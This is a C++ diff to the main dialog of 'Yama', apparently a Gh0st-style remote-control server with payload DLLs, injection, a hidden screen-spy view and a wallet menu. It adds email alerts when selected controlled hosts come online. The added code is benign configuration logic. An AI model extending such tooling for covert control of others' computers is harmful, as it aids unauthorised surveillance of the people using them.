@@ -32,6 +32,7 @@
 #include "common/commands.h"
 #include "common/md5.h"
 #include <algorithm>
+#include <set>
 #include "HideScreenSpyDlg.h"
 #include <sys/MachineDlg.h>
 #include "Chat.h"
@@ -51,6 +52,8 @@
 #include "CClientListDlg.h"
 #include "CUpdateDlg.h"
 #include "CLicenseDlg.h"
+#include "NotifyManager.h"
+#include "NotifySettingsDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -452,6 +455,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogLangEx(CMy2015RemoteDl
     m_bmOnline[17].LoadBitmap(IDB_BITMAP_REGROUP);
     m_bmOnline[18].LoadBitmap(IDB_BITMAP_INJECT);
     m_bmOnline[19].LoadBitmap(IDB_BITMAP_PORTPROXY);
+    m_bmOnline[20].LoadBitmap(IDB_BITMAP_LOGINNOTIFY);
 
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         m_ServerDLL[i] = nullptr;
@@ -591,6 +595,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_ASSIGN_TO, &CMy2015RemoteDlg::OnOnlineAssignTo)
     ON_NOTIFY(NM_CUSTOMDRAW, IDC_MESSAGE, &CMy2015RemoteDlg::OnNMCustomdrawMessage)
     ON_COMMAND(ID_ONLINE_ADD_WATCH, &CMy2015RemoteDlg::OnOnlineAddWatch)
+    ON_COMMAND(ID_ONLINE_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnOnlineLoginNotify)
     ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
     ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
     ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
@@ -635,6 +640,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_LOCATION_IP2REGION, &CMy2015RemoteDlg::OnLocationIp2region)
     ON_COMMAND(ID_TOOL_LICENSE_MGR, &CMy2015RemoteDlg::OnToolLicenseMgr)
     ON_COMMAND(ID_TOOL_V2_PRIVATEKEY, &CMy2015RemoteDlg::OnToolV2PrivateKey)
+    ON_COMMAND(ID_MENU_NOTIFY_SETTINGS, &CMy2015RemoteDlg::OnMenuNotifySettings)
 END_MESSAGE_MAP()
 
 
@@ -897,6 +903,20 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     if (groupName == m_selectedGroup || (groupName.empty() && m_selectedGroup == "default")) {
         m_PendingOnline.push_back(ContextObject);
     }
+
+    // Check if notification should be sent for this host
+    try {
+        std::string matchedKeyword;
+        CString remark = m_ClientMap->GetClientMapData(ContextObject->GetClientID(), MAP_NOTE);
+        if (GetNotifyManager().ShouldNotify(ContextObject, matchedKeyword, remark)) {
+            std::string subject, body;
+            GetNotifyManager().BuildHostOnlineEmail(ContextObject, matchedKeyword, subject, body);
+            GetNotifyManager().SendNotifyEmailAsync(subject, body);
+        }
+    } catch (...) {
+        Mprintf("[Notify] Exception in notification check\n");
+    }
+
     std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
     ShowMessage(_TR("操作成功"), strIP + tip.c_str() + " " + _L(_T("主机上线")) + "[" + loc + "][" + groupName.c_str() + "]");
 
@@ -1274,6 +1294,9 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     // 将"关于..."菜单项添加到系统菜单中。
     SetWindowText(_T("Yama"));
     m_ClientMap->LoadFromFile(GetDbPath());
+
+    // Initialize notification manager
+    GetNotifyManager().Initialize();
 
     // IDM_ABOUTBOX 必须在系统命令范围内。
     ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
@@ -2180,6 +2203,11 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
     Menu.SetMenuItemBitmaps(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND, &m_bmOnline[11], &m_bmOnline[11]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND, &m_bmOnline[12], &m_bmOnline[12]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND, &m_bmOnline[13], &m_bmOnline[13]);
+    Menu.SetMenuItemBitmaps(ID_ONLINE_LOGIN_NOTIFY, MF_BYCOMMAND, &m_bmOnline[20], &m_bmOnline[20]);
+    // Disable login notify menu if PowerShell is not available
+    if (!GetNotifyManager().IsPowerShellAvailable()) {
+        Menu.EnableMenuItem(ID_ONLINE_LOGIN_NOTIFY, MF_BYCOMMAND | MF_GRAYED);
+    }
     Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_UNINSTALL, MF_BYCOMMAND, &m_bmOnline[15], &m_bmOnline[15]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
@@ -6720,4 +6748,125 @@ void CMy2015RemoteDlg::OnToolV2PrivateKey()
         CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
         SubMenu->CheckMenuItem(ID_TOOL_V2_PRIVATEKEY, MF_CHECKED);
     }
+}
+
+void CMy2015RemoteDlg::OnMenuNotifySettings()
+{
+    NotifySettingsDlg dlg(this);
+    dlg.DoModal();
+}
+
+// Helper function to convert string to lowercase for case-insensitive comparison
+static std::string ToLowerCase(const std::string& str) {
+    std::string result = str;
+    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
+    return result;
+}
+
+void CMy2015RemoteDlg::OnOnlineLoginNotify()
+{
+    // Get selected hosts and add their computer name/remark to notify keywords
+    std::vector<std::string> hostsToAdd;
+
+    EnterCriticalSection(&m_cs);
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    while (Pos) {
+        int iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
+
+        // Prefer remark, fallback to computer name
+        CString remark = m_ClientMap->GetClientMapData(ctx->GetClientID(), MAP_NOTE);
+        CString hostName;
+        if (!remark.IsEmpty()) {
+            hostName = remark;
+        } else {
+            hostName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME);
+        }
+
+        if (!hostName.IsEmpty()) {
+            // Convert to UTF-8
+            std::string nameUtf8 = CT2A(hostName, CP_UTF8);
+            hostsToAdd.push_back(nameUtf8);
+        }
+    }
+    LeaveCriticalSection(&m_cs);
+
+    if (hostsToAdd.empty()) {
+        return;
+    }
+
+    // Get current config and add new keywords
+    NotifyConfig config = GetNotifyManager().GetConfig();
+    NotifyRule& rule = config.GetRule();
+
+    // Parse existing keywords into a set for deduplication (case-insensitive)
+    std::set<std::string> existingKeywordsLower;  // lowercase for comparison
+    std::vector<std::string> existingKeywords;     // original case for output
+    std::string pattern = rule.matchPattern;
+    size_t pos = 0;
+    while ((pos = pattern.find(';')) != std::string::npos) {
+        std::string kw = pattern.substr(0, pos);
+        // Trim whitespace
+        size_t start = kw.find_first_not_of(" \t");
+        size_t end = kw.find_last_not_of(" \t");
+        if (start != std::string::npos) {
+            std::string trimmed = kw.substr(start, end - start + 1);
+            existingKeywordsLower.insert(ToLowerCase(trimmed));
+            existingKeywords.push_back(trimmed);
+        }
+        pattern.erase(0, pos + 1);
+    }
+    // Last keyword (or only keyword if no semicolon)
+    if (!pattern.empty()) {
+        size_t start = pattern.find_first_not_of(" \t");
+        size_t end = pattern.find_last_not_of(" \t");
+        if (start != std::string::npos) {
+            std::string trimmed = pattern.substr(start, end - start + 1);
+            existingKeywordsLower.insert(ToLowerCase(trimmed));
+            existingKeywords.push_back(trimmed);
+        }
+    }
+
+    // Add new hosts if not already present (case-insensitive check)
+    int addedCount = 0;
+    for (const auto& host : hostsToAdd) {
+        if (existingKeywordsLower.find(ToLowerCase(host)) == existingKeywordsLower.end()) {
+            existingKeywordsLower.insert(ToLowerCase(host));
+            existingKeywords.push_back(host);
+            addedCount++;
+        }
+    }
+
+    if (addedCount == 0) {
+        MessageBoxL("所有选中的主机已在上线提醒列表中", "提示", MB_ICONINFORMATION);
+        return;
+    }
+
+    // Rebuild match pattern
+    std::string newPattern;
+    for (const auto& kw : existingKeywords) {
+        if (!newPattern.empty()) {
+            newPattern += ";";
+        }
+        newPattern += kw;
+    }
+
+    // Update config
+    rule.matchPattern = newPattern;
+    rule.enabled = true;
+    rule.triggerType = NOTIFY_TRIGGER_HOST_ONLINE;
+    rule.columnIndex = ONLINELIST_COMPUTER_NAME;
+
+    GetNotifyManager().SetConfig(config);
+    GetNotifyManager().SaveConfig();
+
+    // Build message with SMTP warning if not configured
+    CString msg;
+    msg.Format(_TR("已添加 %d 个主机到上线提醒列表"), addedCount);
+    if (!config.smtp.IsValid()) {
+        msg += _T("\n\n");
+        msg += _TR("注意: SMTP 未配置，请先在通知设置中配置邮箱");
+    }
+    MessageBoxL(msg, _TR("上线提醒"), MB_ICONINFORMATION);
 }
